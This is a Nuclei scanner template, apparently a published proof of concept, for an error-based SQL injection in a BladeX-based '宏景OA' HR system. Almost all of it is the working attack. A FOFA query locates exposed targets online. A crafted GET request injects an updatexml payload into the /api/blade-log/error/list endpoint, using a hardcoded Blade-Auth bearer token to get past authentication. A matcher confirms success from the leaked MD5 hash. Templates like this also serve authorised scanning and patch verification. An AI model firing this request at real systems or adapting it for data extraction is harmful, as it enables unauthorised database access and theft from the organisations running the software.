# Add your nuclei formatted PoC!
id: bladex_sql
info:
  name: bladex_sql
  author: 蜜汁狗蛋
  severity: critical
  description: 宏景OASQL注入
  metadata:
    max-request: 1
    fofa-query: body='<div class="hj-hy-all-one-logo"' && title="人力资源信息管理系统"
    verified: true
  tags: sql

requests:
  - raw:
      - |-
        GET /api/blade-log/error/list?updatexml(1,concat(0x5c,md5(123456),0x5c),1)=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ

    req-condition: true
    matchers:
      - type: dsl
        condition: and
        dsl:
          - 'contains((body), "e10adc3949ba59abbe56e057f20f883") && status_code == 500'
author: 蜜汁狗蛋
